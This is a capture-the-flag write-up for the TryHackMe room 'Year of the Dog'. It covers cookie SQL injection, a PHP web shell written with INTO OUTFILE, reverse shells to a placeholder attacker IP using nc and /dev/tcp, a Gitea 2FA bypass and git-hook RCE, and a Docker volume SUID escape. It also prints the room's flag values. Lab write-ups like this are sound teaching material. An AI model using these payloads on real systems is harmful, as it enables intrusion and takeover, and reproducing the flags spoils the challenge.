# 🐕 Year of the Dog — TryHackMe Writeup

> **Author:** Miraç Akkuş (LatenT)
> **Date:** May 2026
> **Room:** [Year of the Dog]()

---

## 📋 Executive Summary

This writeup documents the full exploitation of the **Year of the Dog** machine. The attack chain demonstrates a complex progression starting with Cookie-based SQL injection, shell upload via `INTO OUTFILE`, SSH tunneling, Gitea 2FA bypass, and gaining a Docker container shell through Git Hook RCE. Finally, we achieve host root access via a shared volume escape.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
| --- | --- |
| `nmap` | Network discovery |
| `gobuster` | Directory enumeration |
| `curl` | SQLi exploitation & shell upload |
| `nc` | Reverse shell listener |
| `ssh` | Port forwarding (Gitea access) |
| `Burp Suite` | 2FA bypass & HTTP manipulation |
| `git` | Gitea hook exploitation |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>

```

### Findings

| Port | Status | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | SSH | OpenSSH |
| 80/tcp | open | HTTP | Apache httpd |

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

```

**Discovered Paths:**

* `/index.php` — Canis Queue page
* `/assets` — Static files

**Critical Observation:** An `id=` parameter is present in the Cookie — potential SQL injection vector.

---

## 🌐 Phase 2: SQL Injection → RCE

### Cookie SQLi Verification

```bash
curl -H "Cookie: id=6e210d5176a702468d265a1ab79cde81'" http://<TARGET_IP>/

```

**Result:** SQL error triggered — injection confirmed.

### WAF Bypass (Hex Encoding)

Since `<` and `>` characters are blocked by the WAF, we use hex encoding:

```bash
# Convert PHP payload to hex
mysql> select hex('<?php system($_GET["cmd"]) ?>');
# 3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E

```

### Shell Upload via INTO OUTFILE

```bash
curl -H "Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,unhex('3C3F706870...') INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -" http://<TARGET_IP>/

```

### Verification

```bash
curl http://<TARGET_IP>/shell.php?cmd=id
# uid=33(www-data)

```

### Reverse Shell

**Listener:**

```bash
nc -lvnp 9000

```

**Payload:**

```bash
curl -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 9000 >/tmp/f' http://<TARGET_IP>/shell.php

```

---

## 🚀 Phase 3: Lateral Movement to Dylan

### Log Analysis

```bash
grep -Ri dylan /home/dylan/work_analysis

```

**Finding:**

```
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLa**********f3 from 192.168.1.142

```

**Analysis:** A password was accidentally typed into the username field — format: `dylan` + `La**********f3`

### SSH Login

```bash
su dylan
# Password: La**********f3

```

---

## 🔄 Phase 4: Gitea Access & 2FA Bypass

### Local Service Discovery

```bash
netstat -tulpn

```

**Finding:** Gitea is running on `127.0.0.1:3000`.

### SSH Port Forwarding

```bash
ssh -N -L 3000:127.0.0.1:3000 dylan@<TARGET_IP>

```

### Gitea Authentication & Bypass

* **Username:** `dylan`
* **Password:** `La**********f3`
* **2FA:** Enabled — bypassed via Basic Auth.

Using Burp Suite, adding the `Authorization: Basic [Base64_Creds]` header allows us to bypass the 2FA prompt.

---

## 🐳 Phase 5: Gitea Git Hook → Docker Shell

### Vulnerability

Gitea 1.13.0 allows RCE via Git Hooks (FSA-2020-3).

### Exploit (Pre-receive Hook)

```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1

```

**Result:** Shell obtained as `uid=1000(git)` inside a Docker container.

---

## 🏁 Phase 6: Docker Escape → Host Root

### Shared Volume Analysis

The `/gitea` directory is shared between the host and the container.

### Creating SUID Bash

```bash
# Inside the container (as root)
cd /data/gitea
cp /bin/bash .
chown root:root bash
chmod 4755 bash

```

### Executing on the Host

From the host shell (Dylan):

```bash
cd /gitea/gitea
./bash -p
# euid=0(root)

```

---

## 🛡️ Vulnerability Assessment

| # | Vulnerability | Severity | Mitigation |
| --- | --- | --- | --- |
| 1 | **Cookie-based SQLi** | 🔴 Critical | Use prepared statements; validate input. |
| 2 | **INTO OUTFILE Upload** | 🔴 Critical | Restrict `secure_file_priv`. |
| 3 | **Credential Leaks in Logs** | 🔴 Critical | Implement sensitive data filtering in logs. |
| 4 | **Gitea 2FA Bypass** | 🔴 Critical | Disable Basic Auth; enforce session-based 2FA. |
| 5 | **Git Hook RCE** | 🔴 Critical | Update Gitea; restrict hook execution permissions. |
| 6 | **Unsafe Docker Mounts** | 🟠 High | Use read-only mounts; apply SELinux policies. |

---

## 🚩 Flags

| Flag | Location | Value |
| --- | --- | --- |
| **User Flag** | `/home/dylan/user.txt` | `THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}` |
| **Root Flag** | `/root/root.txt` | `THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}` |

---

> **⚠️ Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---

**Author:** Miraç Akkuş (LatenT)

**Date:** May 2026
